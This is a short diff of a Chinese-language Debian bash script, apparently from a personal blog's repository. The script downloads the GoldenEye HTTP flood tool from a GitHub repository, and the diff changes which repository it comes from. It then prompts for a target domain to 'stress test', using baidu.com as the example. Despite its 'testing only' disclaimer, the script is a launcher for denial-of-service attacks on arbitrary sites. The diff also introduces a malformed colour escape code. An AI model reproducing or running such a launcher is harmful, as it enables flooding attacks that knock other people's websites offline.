@@ -15,7 +15,7 @@ function main(){
     echo "###    Update: 2021-03-12      ###"
     echo ""
     echo -e "\033[41;33m 适用环境 Debian \033[0m"
-    echo "博客链接 yijunmeng.top \033[41;33m请给个星星\033[0m"
+    echo -e "\003[41;33m 博客链接 yijunmeng.top \033[0m"
     echo "---------------------------------------------------------------------------"
     echo -e "\033[41;33m 本脚本仅供测试使用！！不要作死！！请勿用于非法用途！！ \033[0m"
     echo -e "\033[41;33m 回车以继续，ctrl+C退出 \033[0m"
@@ -24,7 +24,7 @@ function main(){
 
     read -n 1
     $Main update -y && $Main upgrade -y
-    wget https://raw.githubusercontent.com/linux-terminal/cc/master/goldeneye.py
+    wget https://raw.githubusercontent.com/qjwxgz/ccpy/main/goldeneye.py
     chmod +x goldeneye.py
     echo "输入要测压的域名： (例: https://baidu.com)"
     read domain
